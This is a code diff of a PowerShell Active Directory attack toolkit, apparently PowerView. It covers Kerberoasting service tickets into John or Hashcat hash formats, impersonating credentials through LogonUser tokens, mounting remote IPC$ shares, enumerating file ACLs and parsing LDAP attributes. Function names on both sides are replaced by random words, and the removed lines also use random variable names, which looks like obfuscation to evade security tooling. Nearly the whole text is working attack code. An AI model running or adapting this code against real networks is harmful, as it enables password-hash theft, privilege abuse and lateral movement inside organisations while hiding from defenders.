+            $Result = $Mpr::WNetAddConnection2W($NetResourceInstance, $Credential.GetNetworkCredential().Password, $Credential.UserName, 4)
+            if ($Result -eq 0) {
+                Write-Verbose "$TargetPath successfully mounted"
             }
             else {
-                Throw "[distinctively] error mounting $VfipJrPp99 : $(([ComponentModel.Win32Exception]$fYOedlSN99).Message)"
+                Throw "[depicting] error mounting $TargetPath : $(([ComponentModel.Win32Exception]$Result).Message)"
             }
         }
     }
 }
-function reeling {
+function withdrew {
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
     [CmdletBinding(DefaultParameterSetName = 'ComputerName')]
     Param(
@@ -1121,7 +1121,7 @@ function reeling {
         [Alias('HostName', 'dnshostname', 'name')]
         [ValidateNotNullOrEmpty()]
         [String[]]
-        $VrEmrUHq99,
+        $ComputerName,
         [Parameter(Position = 0, ParameterSetName = 'Path', Mandatory = $True)]
         [ValidatePattern('\\\\.*\\.*')]
         [String[]]
@@ -1130,83 +1130,83 @@ function reeling {
     PROCESS {
         $Paths = @()
         if ($PSBoundParameters['ComputerName']) {
-            ForEach ($vnhDKlDn99 in $VrEmrUHq99) {
-                $vnhDKlDn99 = $vnhDKlDn99.Trim('\')
-                $Paths += ,"\\$vnhDKlDn99\IPC$"
+            ForEach ($TargetComputerName in $ComputerName) {
+                $TargetComputerName = $TargetComputerName.Trim('\')
+                $Paths += ,"\\$TargetComputerName\IPC$"
             }
         }
         else {
             $Paths += ,$Path
         }
-        ForEach ($VfipJrPp99 in $Paths) {
-            Write-Verbose "[reeling] Attempting to unmount: $VfipJrPp99"
-            $fYOedlSN99 = $Mpr::WNetCancelConnection2($VfipJrPp99, 0, $True)
-            if ($fYOedlSN99 -eq 0) {
-                Write-Verbose "$VfipJrPp99 successfully ummounted"
+        ForEach ($TargetPath in $Paths) {
+            Write-Verbose "[withdrew] Attempting to unmount: $TargetPath"
+            $Result = $Mpr::WNetCancelConnection2($TargetPath, 0, $True)
+            if ($Result -eq 0) {
+                Write-Verbose "$TargetPath successfully ummounted"
             }
             else {
-                Throw "[reeling] error unmounting $VfipJrPp99 : $(([ComponentModel.Win32Exception]$fYOedlSN99).Message)"
+                Throw "[withdrew] error unmounting $TargetPath : $(([ComponentModel.Win32Exception]$Result).Message)"
             }
         }
     }
 }
-function admonished {
+function locale {
     [OutputType([IntPtr])]
     [CmdletBinding(DefaultParameterSetName = 'Credential')]
     Param(
         [Parameter(Mandatory = $True, ParameterSetName = 'Credential')]
         [Management.Automation.PSCredential]
         [Management.Automation.CredentialAttribute()]
-        $gxazvivN99,
+        $Credential,
         [Parameter(Mandatory = $True, ParameterSetName = 'TokenHandle')]
         [ValidateNotNull()]
         [IntPtr]
-        $BmRRNCwx99,
+        $TokenHandle,
         [Switch]
         $Quiet
     )
     if (([System.Threading.Thread]::CurrentThread.GetApartmentState() -ne 'STA') -and (-not $PSBoundParameters['Quiet'])) {
-        Write-Warning "[admonished] powershell.exe is not currently in a single-threaded apartment state, token impersonation may not work."
+        Write-Warning "[locale] powershell.exe is not currently in a single-threaded apartment state, token impersonation may not work."
     }
     if ($PSBoundParameters['TokenHandle']) {
-        $SrzRGHuc99 = $BmRRNCwx99
+        $LogonTokenHandle = $TokenHandle
     }
     else {
-        $SrzRGHuc99 = [IntPtr]::Zero
-        $ycpKMieo99 = $gxazvivN99.GetNetworkCredential()
-        $ojqqfkye99 = $ycpKMieo99.Domain
-        $IsWOPBva99 = $ycpKMieo99.UserName
-        Write-Warning "[admonished] Executing LogonUser() with user: $($ojqqfkye99)\$($IsWOPBva99)"
-        $fYOedlSN99 = $hVuDLVbw99::LogonUser($IsWOPBva99, $ojqqfkye99, $ycpKMieo99.Password, 9, 3, [ref]$SrzRGHuc99);$HWqgzfQS99 = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error();
-        if (-not $fYOedlSN99) {
-            throw "[admonished] LogonUser() Error: $(([ComponentModel.Win32Exception] $HWqgzfQS99).Message)"
+        $LogonTokenHandle = [IntPtr]::Zero
+        $NetworkCredential = $Credential.GetNetworkCredential()
+        $UserDomain = $NetworkCredential.Domain
+        $UserName = $NetworkCredential.UserName
+        Write-Warning "[locale] Executing LogonUser() with user: $($UserDomain)\$($UserName)"
+        $Result = $Advapi32::LogonUser($UserName, $UserDomain, $NetworkCredential.Password, 9, 3, [ref]$LogonTokenHandle);$LastError = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error();
+        if (-not $Result) {
+            throw "[locale] LogonUser() Error: $(([ComponentModel.Win32Exception] $LastError).Message)"
         }
     }
-    $fYOedlSN99 = $hVuDLVbw99::ImpersonateLoggedOnUser($SrzRGHuc99)
-    if (-not $fYOedlSN99) {
-        throw "[admonished] ImpersonateLoggedOnUser() Error: $(([ComponentModel.Win32Exception] $HWqgzfQS99).Message)"
+    $Result = $Advapi32::ImpersonateLoggedOnUser($LogonTokenHandle)
+    if (-not $Result) {
+        throw "[locale] ImpersonateLoggedOnUser() Error: $(([ComponentModel.Win32Exception] $LastError).Message)"
     }
-    Write-Verbose "[admonished] Alternate credentials successfully impersonated"
-    $SrzRGHuc99
+    Write-Verbose "[locale] Alternate credentials successfully impersonated"
+    $LogonTokenHandle
 }
-function Nina {
+function choke {
     [CmdletBinding()]
     Param(
         [ValidateNotNull()]
         [IntPtr]
-        $BmRRNCwx99
+        $TokenHandle
     )
     if ($PSBoundParameters['TokenHandle']) {
-        Write-Warning "[Nina] Reverting token impersonation and closing LogonUser() token handle"
-        $fYOedlSN99 = $Kernel32::CloseHandle($BmRRNCwx99)
+        Write-Warning "[choke] Reverting token impersonation and closing LogonUser() token handle"
+        $Result = $Kernel32::CloseHandle($TokenHandle)
     }
-    $fYOedlSN99 = $hVuDLVbw99::RevertToSelf();$HWqgzfQS99 = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error();
-    if (-not $fYOedlSN99) {
-        throw "[Nina] RevertToSelf() Error: $(([ComponentModel.Win32Exception] $HWqgzfQS99).Message)"
+    $Result = $Advapi32::RevertToSelf();$LastError = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error();
+    if (-not $Result) {
+        throw "[choke] RevertToSelf() Error: $(([ComponentModel.Win32Exception] $LastError).Message)"
     }
-    Write-Verbose "[Nina] Token impersonation successfully reverted"
+    Write-Verbose "[choke] Token impersonation successfully reverted"
 }
-function stiffens {
+function hereto {
     [OutputType('PowerView.SPNTicket')]
     [CmdletBinding(DefaultParameterSetName = 'RawSPN')]
     Param (
@@ -1222,84 +1222,84 @@ function stiffens {
         [ValidateSet('John', 'Hashcat')]
         [Alias('Format')]
         [String]
-        $qnBJcaRO99 = 'Hashcat',
+        $OutputFormat = 'Hashcat',
         [Management.Automation.PSCredential]
         [Management.Automation.CredentialAttribute()]
-        $gxazvivN99 = [Management.Automation.PSCredential]::Empty
+        $Credential = [Management.Automation.PSCredential]::Empty
     )
     BEGIN {
         $Null = [Reflection.Assembly]::LoadWithPartialName('System.IdentityModel')
         if ($PSBoundParameters['Credential']) {
-            $WUqPycDr99 = admonished -Credential $gxazvivN99
+            $LogonToken = locale -Credential $Credential
         }
     }
     PROCESS {
         if ($PSBoundParameters['User']) {
-            $UAGfwAnC99 = $User
+            $TargetObject = $User
         }
         else {
-            $UAGfwAnC99 = $SPN
+            $TargetObject = $SPN
         }
-        ForEach ($Object in $UAGfwAnC99) {
+        ForEach ($Object in $TargetObject) {
             if ($PSBoundParameters['User']) {
-                $XVkCPQlz99 = $Object.ServicePrincipalName
-                $xjbZUAHW99 = $Object.SamAccountName
-                $GmeuRAOD99 = $Object.DistinguishedName
+                $UserSPN = $Object.ServicePrincipalName
+                $SamAccountName = $Object.SamAccountName
+                $DistinguishedName = $Object.DistinguishedName
             }
             else {
-                $XVkCPQlz99 = $Object
-                $xjbZUAHW99 = 'UNKNOWN'
-                $GmeuRAOD99 = 'UNKNOWN'
+                $UserSPN = $Object
+                $SamAccountName = 'UNKNOWN'
+                $DistinguishedName = 'UNKNOWN'
             }
-            if ($XVkCPQlz99 -is [System.DirectoryServices.ResultPropertyValueCollection]) {
-                $XVkCPQlz99 = $XVkCPQlz99[0]
+            if ($UserSPN -is [System.DirectoryServices.ResultPropertyValueCollection]) {
+                $UserSPN = $UserSPN[0]
             }
             try {
-                $ZfbVAKze99 = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $XVkCPQlz99
+                $Ticket = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $UserSPN
             }
             catch {
-                Write-Warning "[stiffens] Error requesting ticket for SPN '$XVkCPQlz99' from user '$GmeuRAOD99' : $_"
+                Write-Warning "[hereto] Error requesting ticket for SPN '$UserSPN' from user '$DistinguishedName' : $_"
             }
-            if ($ZfbVAKze99) {
-                $VJLUFaKk99 = $ZfbVAKze99.GetRequest()
+            if ($Ticket) {
+                $TicketByteStream = $Ticket.GetRequest()
             }
-            if ($VJLUFaKk99) {
+            if ($TicketByteStream) {
                 $Out = New-Object PSObject
-                $IGNiVWtF99 = [System.BitConverter]::ToString($VJLUFaKk99) -replace '-'
-                $Out | Add-Member Noteproperty 'SamAccountName' $xjbZUAHW99
-                $Out | Add-Member Noteproperty 'DistinguishedName' $GmeuRAOD99
-                $Out | Add-Member Noteproperty 'ServicePrincipalName' $ZfbVAKze99.ServicePrincipalName
-                if($IGNiVWtF99 -match 'a382....3082....A0030201(?<EtypeLen>..)A1.{1,4}.......A282(?<CipherTextLen>....)........(?<DataToEnd>.+)') {
+                $TicketHexStream = [System.BitConverter]::ToString($TicketByteStream) -replace '-'
+                $Out | Add-Member Noteproperty 'SamAccountName' $SamAccountName
+                $Out | Add-Member Noteproperty 'DistinguishedName' $DistinguishedName
+                $Out | Add-Member Noteproperty 'ServicePrincipalName' $Ticket.ServicePrincipalName
+                if($TicketHexStream -match 'a382....3082....A0030201(?<EtypeLen>..)A1.{1,4}.......A282(?<CipherTextLen>....)........(?<DataToEnd>.+)') {
                     $Etype = [Convert]::ToByte( $Matches.EtypeLen, 16 )
-                    $wjmEgHYh99 = [Convert]::ToUInt32($Matches.CipherTextLen, 16)-4
-                    $wZaXonzk99 = $Matches.DataToEnd.Substring(0,$wjmEgHYh99*2)
-                    if($Matches.DataToEnd.Substring($wjmEgHYh99*2, 4) -ne 'A482') {
-                        Write-Warning "Error parsing ciphertext for the SPN  $($ZfbVAKze99.ServicePrincipalName). Use the TicketByteHexStream field and extract the hash offline with Get-KerberoastHashFromAPReq"
+                    $CipherTextLen = [Convert]::ToUInt32($Matches.CipherTextLen, 16)-4
+                    $CipherText = $Matches.DataToEnd.Substring(0,$CipherTextLen*2)
+                    if($Matches.DataToEnd.Substring($CipherTextLen*2, 4) -ne 'A482') {
+                        Write-Warning "Error parsing ciphertext for the SPN  $($Ticket.ServicePrincipalName). Use the TicketByteHexStream field and extract the hash offline with Get-KerberoastHashFromAPReq"
                         $Hash = $null
-                        $Out | Add-Member Noteproperty 'TicketByteHexStream' ([Bitconverter]::ToString($VJLUFaKk99).Replace('-',''))
+                        $Out | Add-Member Noteproperty 'TicketByteHexStream' ([Bitconverter]::ToString($TicketByteStream).Replace('-',''))
                     } else {
-                        $Hash = "$($wZaXonzk99.Substring(0,32))`$$($wZaXonzk99.Substring(32))"
+                        $Hash = "$($CipherText.Substring(0,32))`$$($CipherText.Substring(32))"
                         $Out | Add-Member Noteproperty 'TicketByteHexStream' $null
                     }
                 } else {
-                    Write-Warning "Unable to parse ticket structure for the SPN  $($ZfbVAKze99.ServicePrincipalName). Use the TicketByteHexStream field and extract the hash offline with Get-KerberoastHashFromAPReq"
+                    Write-Warning "Unable to parse ticket structure for the SPN  $($Ticket.ServicePrincipalName). Use the TicketByteHexStream field and extract the hash offline with Get-KerberoastHashFromAPReq"
                     $Hash = $null
-                    $Out | Add-Member Noteproperty 'TicketByteHexStream' ([Bitconverter]::ToString($VJLUFaKk99).Replace('-',''))
+                    $Out | Add-Member Noteproperty 'TicketByteHexStream' ([Bitconverter]::ToString($TicketByteStream).Replace('-',''))
                 }
                 if($Hash) {
-                    if ($qnBJcaRO99 -match 'John') {
-                        $PbBgcUoB99 = "`$pZdMNjte99`$$($ZfbVAKze99.ServicePrincipalName):$Hash"
+                    if ($OutputFormat -match 'John') {
+                        $HashFormat = "`$krb5tgs`$$($Ticket.ServicePrincipalName):$Hash"
                     }
                     else {
-                        if ($GmeuRAOD99 -ne 'UNKNOWN') {
-                            $ojqqfkye99 = $GmeuRAOD99.SubString($GmeuRAOD99.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
+                        if ($DistinguishedName -ne 'UNKNOWN') {
+                            $UserDomain = $DistinguishedName.SubString($DistinguishedName.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                         }
                         else {
-                            $ojqqfkye99 = 'UNKNOWN'
+                            $UserDomain = 'UNKNOWN'
                         }
-                        $PbBgcUoB99 = "`$pZdMNjte99`$$($Etype)`$*$xjbZUAHW99`$$ojqqfkye99`$$($ZfbVAKze99.ServicePrincipalName)*`$$Hash"
+                        $HashFormat = "`$krb5tgs`$$($Etype)`$*$SamAccountName`$$UserDomain`$$($Ticket.ServicePrincipalName)*`$$Hash"
                     }
-                    $Out | Add-Member Noteproperty 'Hash' $PbBgcUoB99
+                    $Out | Add-Member Noteproperty 'Hash' $HashFormat
                 }
                 $Out.PSObject.TypeNames.Insert(0, 'PowerView.SPNTicket')
                 $Out
@@ -1307,12 +1307,12 @@ function stiffens {
         }
     }
     END {
-        if ($WUqPycDr99) {
-            Nina -TokenHandle $WUqPycDr99
+        if ($LogonToken) {
+            choke -TokenHandle $LogonToken
         }
     }
 }
-function deformation {
+function lateralling {
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
     [OutputType('PowerView.SPNTicket')]
     [CmdletBinding()]
@@ -1320,70 +1320,70 @@ function deformation {
         [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
         [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
         [String[]]
-        $BfpbWwpi99,
+        $Identity,
         [ValidateNotNullOrEmpty()]
         [String]
-        $SSNUOPgW99,
+        $Domain,
         [ValidateNotNullOrEmpty()]
         [Alias('Filter')]
         [String]
-        $HOOTOEqu99,
+        $LDAPFilter,
         [ValidateNotNullOrEmpty()]
         [Alias('ADSPath')]
         [String]
-        $FNgTGwmR99,
+        $SearchBase,
         [ValidateNotNullOrEmpty()]
         [Alias('DomainController')]
         [String]
-        $mSxqoOjK99,
+        $Server,
         [ValidateSet('Base', 'OneLevel', 'Subtree')]
         [String]
-        $vaSWXjPs99 = 'Subtree',
+        $SearchScope = 'Subtree',
         [ValidateRange(1, 10000)]
         [Int]
-        $mhcqrrQn99 = 200,
+        $ResultPageSize = 200,
         [ValidateRange(1, 10000)]
         [Int]
-        $mvTbAWDU99,
+        $ServerTimeLimit,
         [Switch]
-        $rPozaKft99,
+        $Tombstone,
         [ValidateSet('John', 'Hashcat')]
         [Alias('Format')]
         [String]
-        $qnBJcaRO99 = 'Hashcat',
+        $OutputFormat = 'Hashcat',
         [Management.Automation.PSCredential]
         [Management.Automation.CredentialAttribute()]
-        $gxazvivN99 = [Management.Automation.PSCredential]::Empty
+        $Credential = [Management.Automation.PSCredential]::Empty
     )
     BEGIN {
-        $xUaDkcfD99 = @{
+        $UserSearcherArguments = @{
             'SPN' = $True
             'Properties' = 'samaccountname,distinguishedname,serviceprincipalname'
         }
-        if ($PSBoundParameters['Domain']) { $xUaDkcfD99['Domain'] = $SSNUOPgW99 }
-        if ($PSBoundParameters['LDAPFilter']) { $xUaDkcfD99['LDAPFilter'] = $HOOTOEqu99 }
-        if ($PSBoundParameters['SearchBase']) { $xUaDkcfD99['SearchBase'] = $FNgTGwmR99 }
-        if ($PSBoundParameters['Server']) { $xUaDkcfD99['Server'] = $mSxqoOjK99 }
-        if ($PSBoundParameters['SearchScope']) { $xUaDkcfD99['SearchScope'] = $vaSWXjPs99 }
-        if ($PSBoundParameters['ResultPageSize']) { $xUaDkcfD99['ResultPageSize'] = $mhcqrrQn99 }
-        if ($PSBoundParameters['ServerTimeLimit']) { $xUaDkcfD99['ServerTimeLimit'] = $mvTbAWDU99 }
-        if ($PSBoundParameters['Tombstone']) { $xUaDkcfD99['Tombstone'] = $rPozaKft99 }
-        if ($PSBoundParameters['Credential']) { $xUaDkcfD99['Credential'] = $gxazvivN99 }
+        if ($PSBoundParameters['Domain']) { $UserSearcherArguments['Domain'] = $Domain }
+        if ($PSBoundParameters['LDAPFilter']) { $UserSearcherArguments['LDAPFilter'] = $LDAPFilter }
+        if ($PSBoundParameters['SearchBase']) { $UserSearcherArguments['SearchBase'] = $SearchBase }
+        if ($PSBoundParameters['Server']) { $UserSearcherArguments['Server'] = $Server }
+        if ($PSBoundParameters['SearchScope']) { $UserSearcherArguments['SearchScope'] = $SearchScope }
+        if ($PSBoundParameters['ResultPageSize']) { $UserSearcherArguments['ResultPageSize'] = $ResultPageSize }
+        if ($PSBoundParameters['ServerTimeLimit']) { $UserSearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
+        if ($PSBoundParameters['Tombstone']) { $UserSearcherArguments['Tombstone'] = $Tombstone }
+        if ($PSBoundParameters['Credential']) { $UserSearcherArguments['Credential'] = $Credential }
         if ($PSBoundParameters['Credential']) {
-            $WUqPycDr99 = admonished -Credential $gxazvivN99
+            $LogonToken = locale -Credential $Credential
         }
     }
     PROCESS {
-        if ($PSBoundParameters['Identity']) { $xUaDkcfD99['Identity'] = $BfpbWwpi99 }
-        township @UserSearcherArguments | Where-Object {$_.samaccountname -ne 'krbtgt'} | stiffens -OutputFormat $qnBJcaRO99
+        if ($PSBoundParameters['Identity']) { $UserSearcherArguments['Identity'] = $Identity }
+        prissier @UserSearcherArguments | Where-Object {$_.samaccountname -ne 'krbtgt'} | hereto -OutputFormat $OutputFormat
     }
     END {
-        if ($WUqPycDr99) {
-            Nina -TokenHandle $WUqPycDr99
+        if ($LogonToken) {
+            choke -TokenHandle $LogonToken
         }
     }
 }
-function Delicious {
+function introducing {
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
     [OutputType('PowerView.FileACL')]
     [CmdletBinding()]
@@ -1394,10 +1394,10 @@ function Delicious {
         $Path,
         [Management.Automation.PSCredential]
         [Management.Automation.CredentialAttribute()]
-        $gxazvivN99 = [Management.Automation.PSCredential]::Empty
+        $Credential = [Management.Automation.PSCredential]::Empty
     )
     BEGIN {
-        function menswear {
+        function jurisprudence {
             [CmdletBinding()]
             Param(
                 [Int]
@@ -1425,7 +1425,7 @@ function Delicious {
                 [uint32]'0x00000002' = 'WriteData/AddFile'
                 [uint32]'0x00000001' = 'ReadData/ListDirectory'
             }
-            $YAWBLZCQ99 = @{
+            $SimplePermissions = @{
                 [uint32]'0x1f01ff' = 'FullControl'
                 [uint32]'0x0301bf' = 'Modify'
                 [uint32]'0x0200a9' = 'ReadAndExecute'
@@ -1433,37 +1433,37 @@ function Delicious {
                 [uint32]'0x020089' = 'Read'
                 [uint32]'0x000116' = 'Write'
             }
-            $MxQAWcBe99 = @()
-            $MxQAWcBe99 += $YAWBLZCQ99.Keys | ForEach-Object {
+            $Permissions = @()
+            $Permissions += $SimplePermissions.Keys | ForEach-Object {
                               if (($FSR -band $_) -eq $_) {
-                                $YAWBLZCQ99[$_]
+                                $SimplePermissions[$_]
                                 $FSR = $FSR -band (-not $_)
                               }
                             }
-            $MxQAWcBe99 += $AccessMask.Keys | Where-Object { $FSR -band $_ } | ForEach-Object { $AccessMask[$_] }
-            ($MxQAWcBe99 | Where-Object {$_}) -join ','
+            $Permissions += $AccessMask.Keys | Where-Object { $FSR -band $_ } | ForEach-Object { $AccessMask[$_] }
+            ($Permissions | Where-Object {$_}) -join ','
         }
-        $gshqUOUz99 = @{}
-        if ($PSBoundParameters['Credential']) { $gshqUOUz99['Credential'] = $gxazvivN99 }
-        $nFPezvSf99 = @{}
+        $ConvertArguments = @{}
+        if ($PSBoundParameters['Credential']) { $ConvertArguments['Credential'] = $Credential }
+        $MappedComputers = @{}
     }
     PROCESS {
-        ForEach ($VfipJrPp99 in $Path) {
+        ForEach ($TargetPath in $Path) {
             try {
-                if (($VfipJrPp99 -Match '\\\\.*\\.*') -and ($PSBoundParameters['Credential'])) {
-                    $GVmMliRp99 = (New-Object System.Uri($VfipJrPp99)).Host
-                    if (-not $nFPezvSf99[$GVmMliRp99]) {
-                        distinctively -ComputerName $GVmMliRp99 -Credential $gxazvivN99
-                        $nFPezvSf99[$GVmMliRp99] = $True
+                if (($TargetPath -Match '\\\\.*\\.*') -and ($PSBoundParameters['Credential'])) {
+                    $HostComputer = (New-Object System.Uri($TargetPath)).Host
+                    if (-not $MappedComputers[$HostComputer]) {
+                        depicting -ComputerName $HostComputer -Credential $Credential
+                        $MappedComputers[$HostComputer] = $True
                     }
                 }
-                $ACL = Get-Acl -Path $VfipJrPp99
+                $ACL = Get-Acl -Path $TargetPath
                 $ACL.GetAccessRules($True, $True, [System.Security.Principal.SecurityIdentifier]) | ForEach-Object {
                     $SID = $_.IdentityReference.Value
-                    $Name = woodmen -ObjectSID $SID @ConvertArguments
+                    $Name = armpits -ObjectSID $SID @ConvertArguments
                     $Out = New-Object PSObject
-                    $Out | Add-Member Noteproperty 'Path' $VfipJrPp99
-                    $Out | Add-Member Noteproperty 'FileSystemRights' (menswear -FSR $_.FileSystemRights.value__)
+                    $Out | Add-Member Noteproperty 'Path' $TargetPath
+                    $Out | Add-Member Noteproperty 'FileSystemRights' (jurisprudence -FSR $_.FileSystemRights.value__)
                     $Out | Add-Member Noteproperty 'IdentityReference' $Name
                     $Out | Add-Member Noteproperty 'IdentitySID' $SID
                     $Out | Add-Member Noteproperty 'AccessControlType' $_.AccessControlType
@@ -1472,104 +1472,104 @@ function Delicious {
                 }
             }
             catch {
-                Write-Verbose "[Delicious] error: $_"
+                Write-Verbose "[introducing] error: $_"
             }
         }
     }
     END {
-        $nFPezvSf99.Keys | reeling
+        $MappedComputers.Keys | withdrew
     }
 }
-function Buddy {
+function bookie {
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
     [OutputType('System.Management.Automation.PSCustomObject')]
     [CmdletBinding()]
     Param(
         [Parameter(Mandatory = $True, ValueFromPipeline = $True)]
         [ValidateNotNullOrEmpty()]
-        $SdzJuWMG99
+        $Properties
     )
-    $yqsVbWpr99 = @{}
-    $SdzJuWMG99.PropertyNames | ForEach-Object {
+    $ObjectProperties = @{}
+    $Properties.PropertyNames | ForEach-Object {
         if ($_ -ne 'adspath') {
             if (($_ -eq 'objectsid') -or ($_ -eq 'sidhistory')) {
-                $yqsVbWpr99[$_] = $SdzJuWMG99[$_] | ForEach-Object { (New-Object System.Security.Principal.SecurityIdentifier($_, 0)).Value }
+                $ObjectProperties[$_] = $Properties[$_] | ForEach-Object { (New-Object System.Security.Principal.SecurityIdentifier($_, 0)).Value }
             }
             elseif ($_ -eq 'grouptype') {
-                $yqsVbWpr99[$_] = $SdzJuWMG99[$_][0] -as $RAkiSvHr99
+                $ObjectProperties[$_] = $Properties[$_][0] -as $GroupTypeEnum
             }
             elseif ($_ -eq 'samaccounttype') {
-                $yqsVbWpr99[$_] = $SdzJuWMG99[$_][0] -as $FRRsEGRX99
+                $ObjectProperties[$_] = $Properties[$_][0] -as $SamAccountTypeEnum
             }
             elseif ($_ -eq 'objectguid') {
-                $yqsVbWpr99[$_] = (New-Object Guid (,$SdzJuWMG99[$_][0])).Guid
+                $ObjectProperties[$_] = (New-Object Guid (,$Properties[$_][0])).Guid
             }
             elseif ($_ -eq 'useraccountcontrol') {
-                $yqsVbWpr99[$_] = $SdzJuWMG99[$_][0] -as $oqUiXgaF99
+                $ObjectProperties[$_] = $Properties[$_][0] -as $UACEnum
             }
             elseif ($_ -eq 'ntsecuritydescriptor') {
-                $nNoTTUwp99 = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $SdzJuWMG99[$_][0], 0
-                if ($nNoTTUwp99.Owner) {
-                    $yqsVbWpr99['Owner'] = $nNoTTUwp99.Owner
+                $Descriptor = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $Properties[$_][0], 0
+                if ($Descriptor.Owner) {
+                    $ObjectProperties['Owner'] = $Descriptor.Owner
                 }
-                if ($nNoTTUwp99.Group) {
-                    $yqsVbWpr99['Group'] = $nNoTTUwp99.Group
+                if ($Descriptor.Group) {
+                    $ObjectProperties['Group'] = $Descriptor.Group
                 }
-                if ($nNoTTUwp99.DiscretionaryAcl) {
-                    $yqsVbWpr99['DiscretionaryAcl'] = $nNoTTUwp99.DiscretionaryAcl
+                if ($Descriptor.DiscretionaryAcl) {
+                    $ObjectProperties['DiscretionaryAcl'] = $Descriptor.DiscretionaryAcl
                 }
-                if ($nNoTTUwp99.SystemAcl) {
-                    $yqsVbWpr99['SystemAcl'] = $nNoTTUwp99.SystemAcl
+                if ($Descriptor.SystemAcl) {
+                    $ObjectProperties['SystemAcl'] = $Descriptor.SystemAcl
                 }
             }
             elseif ($_ -eq 'accountexpires') {
-                if ($SdzJuWMG99[$_][0] -gt [DateTime]::MaxValue.Ticks) {
-                    $yqsVbWpr99[$_] = "NEVER"
+                if ($Properties[$_][0] -gt [DateTime]::MaxValue.Ticks) {
+                    $ObjectProperties[$_] = "NEVER"
                 }
                 else {
-                    $yqsVbWpr99[$_] = [datetime]::fromfiletime($SdzJuWMG99[$_][0])
+                    $ObjectProperties[$_] = [datetime]::fromfiletime($Properties[$_][0])
                 }
             }
             elseif ( ($_ -eq 'lastlogon') -or ($_ -eq 'lastlogontimestamp') -or ($_ -eq 'pwdlastset') -or ($_ -eq 'lastlogoff') -or ($_ -eq 'badPasswordTime') ) {
-                if ($SdzJuWMG99[$_][0] -is [System.MarshalByRefObject]) {
-                    $Temp = $SdzJuWMG99[$_][0]
+                if ($Properties[$_][0] -is [System.MarshalByRefObject]) {
+                    $Temp = $Properties[$_][0]
                     [Int32]$High = $Temp.GetType().InvokeMember('HighPart', [System.Reflection.BindingFlags]::GetProperty, $Null, $Temp, $Null)
                     [Int32]$Low  = $Temp.GetType().InvokeMember('LowPart',  [System.Reflection.BindingFlags]::GetProperty, $Null, $Temp, $Null)
-                    $yqsVbWpr99[$_] = ([datetime]::FromFileTime([Int64]("0x{0:x8}{1:x8}" -f $High, $Low)))
+                    $ObjectProperties[$_] = ([datetime]::FromFileTime([Int64]("0x{0:x8}{1:x8}" -f $High, $Low)))
                 }
                 else {
-                    $yqsVbWpr99[$_] = ([datetime]::FromFileTime(($SdzJuWMG99[$_][0])))
+                    $ObjectProperties[$_] = ([datetime]::FromFileTime(($Properties[$_][0])))
                 }
             }
-            elseif ($SdzJuWMG99[$_][0] -is [System.MarshalByRefObject]) {
-                $Prop = $SdzJuWMG99[$_]
+            elseif ($Properties[$_][0] -is [System.MarshalByRefObject]) {
+                $Prop = $Properties[$_]
                 try {
                     $Temp = $Prop[$_][0]
                     [Int32]$High = $Temp.GetType().InvokeMember('HighPart', [System.Reflection.BindingFlags]::GetProperty, $Null, $Temp, $Null)
                     [Int32]$Low  = $Temp.GetType().InvokeMember('LowPart',  [System.Reflection.BindingFlags]::GetProperty, $Null, $Temp, $Null)
-                    $yqsVbWpr99[$_] = [Int64]("0x{0:x8}{1:x8}" -f $High, $Low)
+                    $ObjectProperties[$_] = [Int64]("0x{0:x8}{1:x8}" -f $High, $Low)
                 }
                 catch {
-                    Write-Verbose "[Buddy] error: $_"
-                    $yqsVbWpr99[$_] = $Prop[$_]
+                    Write-Verbose "[bookie] error: $_"
+                    $ObjectProperties[$_] = $Prop[$_]
                 }
             }
-            elseif ($SdzJuWMG99[$_].count -eq 1) {
-                $yqsVbWpr99[$_] = $SdzJuWMG99[$_][0]
+            elseif ($Properties[$_].count -eq 1) {
+                $ObjectProperties[$_] = $Properties[$_][0]
             }
             else {
-                $yqsVbWpr99[$_] = $SdzJuWMG99[$_]
+                $ObjectProperties[$_] = $Properties[$_]
             }
         }
     }
     try {
-        New-Object -TypeName PSObject -Property $yqsVbWpr99
+        New-Object -TypeName PSObject -Property $ObjectProperties
     }
     catch {
-        Write-Warning "[Buddy] Error parsing LDAP properties : $_"
+        Write-Warning "[bookie] Error parsing LDAP properties : $_"
     }
 }
-function watersides {
+function deadly {
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
     [OutputType('System.DirectoryServices.DirectorySearcher')]
     [CmdletBinding()]
@@ -1577,133 +1577,133 @@ function watersides {
         [Parameter(ValueFromPipeline = $True)]
         [ValidateNotNullOrEmpty()]
         [String]
-        $SSNUOPgW99,
+        $Domain,
         [ValidateNotNullOrEmpty()]
         [Alias('Filter')]
         [String]
-        $HOOTOEqu99,
+        $LDAPFilter,
         [ValidateNotNullOrEmpty()]
         [String[]]
-        $SdzJuWMG99,
+        $Properties,
         [ValidateNotNullOrEmpty()]
         [Alias('ADSPath')]
         [String]
-        $FNgTGwmR99,
+        $SearchBase,
         [ValidateNotNullOrEmpty()]
         [String]
-        $hhaBpean99,
+        $SearchBasePrefix,
         [ValidateNotNullOrEmpty()]
         [Alias('DomainController')]
         [String]
-        $mSxqoOjK99,
+        $Server,
         [ValidateSet('Base', 'OneLevel', 'Subtree')]
         [String]
-        $vaSWXjPs99 = 'Subtree',
+        $SearchScope = 'Subtree',
         [ValidateRange(1, 10000)]
         [Int]
-        $mhcqrrQn99 = 200,
+        $ResultPageSize = 200,
         [ValidateRange(1, 10000)]
         [Int]
-        $mvTbAWDU99 = 120,
+        $ServerTimeLimit = 120,
